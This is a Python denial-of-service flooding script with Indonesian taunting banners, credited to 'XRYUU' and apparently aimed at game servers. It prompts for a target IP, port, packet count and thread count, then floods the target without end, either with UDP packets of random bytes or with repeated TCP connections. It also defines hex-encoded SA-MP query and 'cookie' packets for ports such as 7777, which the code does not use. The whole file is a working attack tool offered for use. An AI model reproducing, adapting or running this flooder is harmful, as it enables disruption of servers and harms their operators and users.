import socket
import struct
import time
import codecs,sys
import random
import socket
import threading
import os

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]

os.system("clear")
print("\033[31mREMAKE BY XRYUU")
print("\033[31mABUSE? MATI AJA LU")
print("\033[31mDI SENGGOL NANGIS")
ip = str(input(" [?]Xryuu Attacked | Ip:"))
port = int(input(" [?]Xryuu Attacked | Port:"))
choice = str(input(" [?]Xryuu Attacked | Senggol Gak Nih?(y/n):"))
times = int(input(" [?]Not Abuse| Packets:"))
threads = int(input(" [?]Not Abuse | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[]","[?]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"[!]Xryuu is here!!")
		except:
			print("[?]Disenggol Xryuu ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[!]","[!]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"[!]Disenggol Xryuu")
		except:
			s.close()
			print("[!]Xryuu is here!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()